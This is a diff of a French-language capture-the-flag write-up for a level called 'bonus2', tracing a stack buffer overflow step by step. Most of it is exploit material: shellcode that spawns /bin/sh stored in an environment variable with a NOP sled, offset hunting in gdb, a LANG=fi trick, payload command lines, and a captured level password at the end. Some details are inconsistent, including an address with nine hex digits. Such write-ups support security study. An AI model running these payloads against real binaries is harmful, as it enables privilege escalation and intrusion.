@@ -153,59 +153,24 @@ Program received signal SIGSEGV, Segmentation fault.
 
 Nous voyons que le programme segfault car il ecrase eip a partir de l'offset 5
 
+Essayons d'exporter un shellcode, de trouver son adresse et de rediriger le programme vers cette adresse en ecrasant le registre eip.
 
-/##################################################
-Essayons donc de mettre un shellcode dans une variable d'environnement comme pour le bonus0 et cherchons son adresse pour monter notre exploit :
+export EGG=`python -c 'print "\x90" * 100 + "\x31\xc0\x31\xdb\x31\xd2\x53\x68\x55\x6e\x69\x0a\x68\x64\x55\x55\x4d\x68\x41\x68\x6d\x61\x89\xe1\xb2\x0f\xb0\x04\xcd\x80\x31\xc0\x31\xdb\x31\xc9\xb0\x17\xcd\x80\x31\xc0\x50\x68\x6e\x2f\x73\x68\x68\x2f\x2f\x62\x69\x89\xe3\x8d\x54\x24\x08\x50\x53\x8d\x0c\x24\xb0\x0b\xcd\x80\x31\xc0\xb0\x01\xcd\x80"'`
 
-(gdb) r `python -c 'print "A" * 14 + "\x85\xf8\xff\xbf" + "A" * 22'` `python -c 'print "B" * 26'`
-Starting program: /home/user/bonus2/bonus2 `python -c 'print "A" * 14 + "\x85\xf8\xff\xbf" + "A" * 22'` `python -c 'print "B" * 26'`
-Hello AAAAAAAAAAAAAA����AAAAAAAAAAAAAAAAAAAAAABBBBBBBBBBBBBBBBBBBBBBBBBB
+Dans gdb on cherche l'adresse et on adapte notre exploit : 
+adresse trouvee pour le shellcode : 0xbffff88d4
+
+exploit : ./bonus2 `python -c 'print "AAAA" + "\x84\xf8\xff\xbf" + "A" * 32'` `python -c 'print "B" * 26'`
+
+Segfault -> grace a dmesg on remarque que eip = 0 bizarre ???
+
+Nous remarquons la presence d'un getenv qui va cmp le resultat a deux valeurs : fi et nl
+Or pour nous LANG=en_US.UTF-8
+Essayons de set LANG a fi pour retester : export LANG=fi
+Cette fois le programme segfault mais dans les B de argv[2]
+Cherchons l'offset : 14
+Adaptons l'exploit : ./bonus2 `python -c 'print "A" * 40 + " " + "B" * 18 + "\x84\xf8\xff\xbf" + "B" * 4'`
+Hyvää päivää AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAABBBBBBBBBBBBBBBBBB����BBBB
 AhmadUUMUni
-process 4519 is executing new program: /bin/dash
-$
-
-La commande /bin/dash a bien ete lancée !
-Cependant hors gdb notre programme segfault, surement a cause du gentenv prensent dans notre fonction main, dommage
-###################################################?
-Essayons autrement : 
-(gdb) r `python -c 'print "A" * 14 + "BBBB" + "\x90" * 22'` `python -c 'print "\x90" * 26'`
-The program being debugged has been started already.
-Start it from the beginning? (y or n) y
-
-Starting program: /home/user/bonus2/bonus2 `python -c 'print "A" * 14 + "BBBB" + "\x90" * 22'` `python -c 'print "\x90" * 26'`
-Hello AAAAAAAAAAAAAABBBB������������������������������������������������
-
-Program received signal SIGSEGV, Segmentation fault.
-0x42424242 in ?? ()
-(gdb) x/40xw $esp
-0xbffff508:	0x90909090	0x90909090	0x90909090	0x90909090
-0xbffff518:	0x90909090	0x90909090	0x90909090	0x90909090
-0xbffff528:	0x90909090	0x90909090	0x90909090	0x90909090
-0xbffff538:	0xbffff500	0x08048630	0x41414141	0x41414141
-0xbffff548:	0x41414141	0x42424141	0x90904242	0x90909090
-0xbffff558:	0x90909090	0x90909090	0x90909090	0x90909090
-0xbffff568:	0x90909090	0x90909090	0x90909090	0x90909090
-0xbffff578:	0x90909090	0x90909090	0x00009090	0x00000000
-0xbffff588:	0x00000000	0xb7e5ec73	0x41414141	0x41414141
-0xbffff598:	0x41414141	0x42424141	0x90904242	0x90909090
-
-
-Essayons de rentrer un shellcode a la place de nos NOP et d'envoyer l'adresse des NOP.
-
-r `python -c 'print "\x90" * 4 + "\xa8\xf5\xff\xbf" + "\x90" * 32'` `python -c 'print "\x90" + "\x31\xc0\x50\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x50\x89\xe2\x53\x89\xe1\xb0\x0b\xcd\x80"'`
-
-Le shellcode s'execute bien cependant lors de l'execution de l'exploit hors gdb cela segfault. 
-Grace a dmesg nous voyons que nous segfaultons car l'adresse de eip est 0x90909090 a ce surement a cause d'un decalage avec gdb il va donc falloir trouver l'offset correct :
-
-./bonus2 `python -c 'print "A" * 4 + "\x58\xf6\xff\xbf" + "AAAABBBBCCCCDDDDEEEEFFFFGGGGHHHH"'` `python -c 'print "\x90"+ "\x31\xc0\x50\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x50\x89\xe2\x53\x89\xe1\xb0\x0b\xcd\x80"'`
-Hello AAAAX���AAAABBBBCCCCDDDDEEEEFFFFGGGGHHHH�1�Ph//shh/bin��P��S��
-                                                                     ̀
-Segmentation fault (core dumped)
-
-Nous voyons encore une fois grace a dmesg que nous segfaultons a l'adresse 47474646 qui correspong a FFGG dans notre chaine de caractere. Nous adaptons notre exploit : 
-
-./bonus2 `python -c 'print "A" * 4 + "\x58\xf6\xff\xbf" + "AAAABBBBCCCCDDDDEEEEFF\x58\xf6\xff\xbfGGHHHH"'` `python -c 'print "\x90"+ "\x31\xc0\x50\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x50\x89\xe2\x53\x89\xe1\xb0\x0b\xcd\x80"'`
-Hello AAAAX���AAAABBBBCCCCDDDDEEEEFFX���GGHHHH�1�Ph//shh/bin��P��S��
-                                                                     ̀
 $ cat /home/user/bonus3/.pass
 71d449df0f960b36e0055eb58c14d0f5d0ddc0b35328d657f91cf0df15910587
